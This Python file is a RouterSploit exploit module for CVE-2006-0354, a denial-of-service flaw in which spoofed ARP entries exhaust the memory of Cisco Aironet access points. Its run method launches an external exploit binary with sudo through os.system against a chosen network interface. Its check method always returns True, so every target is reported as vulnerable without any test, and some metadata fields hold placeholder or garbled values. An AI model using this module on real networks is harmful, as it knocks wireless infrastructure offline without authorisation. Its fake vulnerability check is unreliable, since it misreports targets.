
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2006-0354",

        "description": "There is a vulnerability in ciscoaironet's handling of ARP requests,  "
                       "which could be exploited by a remote attacker to cause a denial of service attack on the device. "
                       "An attacker who can successfully associate a ciscoios wireless access point can spoof the "
                       "ARP message of the access point management interface.An attacker can add entries to the ARP "
                       "list of the device until the physical memory is completely exhausted.",

        "authors": (

            "Pasv",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/1447",

        ),

        "devices": (

            "Hasbani, CVE-2006-0354"
        ),
    }


    device = OptString("","Interface name")

    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'sudo ./{} {}'.format('exploit-db-1447',self.device)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
